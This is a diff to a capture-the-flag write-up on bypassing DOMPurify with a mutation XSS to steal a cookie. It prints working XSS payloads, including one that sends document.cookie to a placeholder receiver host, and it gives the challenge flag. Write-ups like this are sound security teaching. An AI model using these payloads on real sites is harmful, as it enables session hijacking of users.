@@ -11,7 +11,7 @@ You have one URL to test your payloads and the other one to validate your flag. 
 http://qual-challs.rtfm.re:8080/
 http://qual-challs.rtfm.re:8080/check
 ```
-
+![Image](https://eqqn.github.io/images/hobe.jpg)
 ### Finding injection point
 Since there is no obvious forms or input elements apparent, we look at the page source ( follow comments for my thought proccess ) :
 
@@ -50,33 +50,42 @@ Since there is no obvious forms or input elements apparent, we look at the page 
 ```
 
 The *getUrlParam* function takes url parameter *layout* and puts it inside "injection" element of the webpage. 
-Queries such as ` http://qual-challs.rtfm.re:8080/?layout=YOURSTRINGHERE ` will render on the page. However there is pesky **DOMPurify.sanitize(layout);** getting in our way of triggering the desired alert(1) box.
+Queries such as ` http://qual-challs.rtfm.re:8080/?layout=YOURSTRINGHERE ` will render on the page.
+
+![Image](https://eqqn.github.io/images/hobe2.jpg)
+
+However there is pesky **DOMPurify.sanitize(layout);** getting in our way of triggering the desired alert(1) box.
 After giving automated tools a try ( XSStrike and Burpsuite) and trying to concatenate some form of <script>alert(1)</script> to render on the page I kept getting owned by the sanitizer. 
 
 Alternatives from XSS cheat sheets[1][2]( that apply to chrome) didn't seem to work. However my friend point me to an interesting resource - DOMPurify bypass.
 
 ### Bypassing DOMPurify
 
-There is an excellent write-up describing the vulnerability (that has since been patched) on DOMPurify, that uses browsers auto-fix feature to close the tags of HTML elements that are not properly matching.
+There is an excellent write-up describing a recent vulnerability in DOMPurify, that uses browsers auto-fix feature to close the tags of HTML elements that are not properly matching.
 
 More on this behaviour here : https://research.securitum.com/dompurify-bypass-using-mxss/
 
 So the PoC payload referenced in the article looks like this : 
 
 ` <svg></p><style><a id="</style><img src=1 onerror=alert(1)>"> `
-However it uses both **img** and **onerror** tags, so we can look once again at the cheat sheets and find other components that could do the trick. 
+However it uses both **img** and **onerror** tags stripped by *NuclearSanitizer()*, so we can look once again at the cheat sheets and find other components that could do the trick. 
+
+![Image](https://eqqn.github.io/images/hobe3.jpg)
 
 `?layout=<svg></p><style><a id="</style><iframe src=1 onmouseover=alert(1)>"> `
-With this I popped the first alert. DOmPurify is bypassed. Great, now to make it run without interaction and onto exfiltration. In this part you can get creative.
+With this I popped the first alert. DOMPurify is bypassed. Great, now to make it run without interaction and onto exfiltration. In this part you can get creative.
 
 To steal the cookie, you need to make a request and transfer it to a domain you control. A convenient web service for that is "Requestbin", which allows you to make receive requests on their servers.
 
-`?layout=<svg></p><style><a id="</style><iframe src=javascript:document.location='hxxps://REPLACE-WITH-YOUR-RECEIVER/cookie='+ document.cookie>">`
+`?layout=<svg></p><style><a id="</style><iframe src=javascript:document.location='hxxps://REPLACE-WITH-YOUR-RECEIVER/'+ document.cookie>">`
 
+Once we submit the full URL into the validator, a HTTP request is made to our cookie receiver server :
 
+![Image](https://eqqn.github.io/images/hobe4.jpg)
 
+`flag=sigsegv{pur1fy_mY_s0ul}`
 
-
+This was a fun challenge, and I got to learn XSS the fun way. 
 
 
 [1] Web Security Academy XSS cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
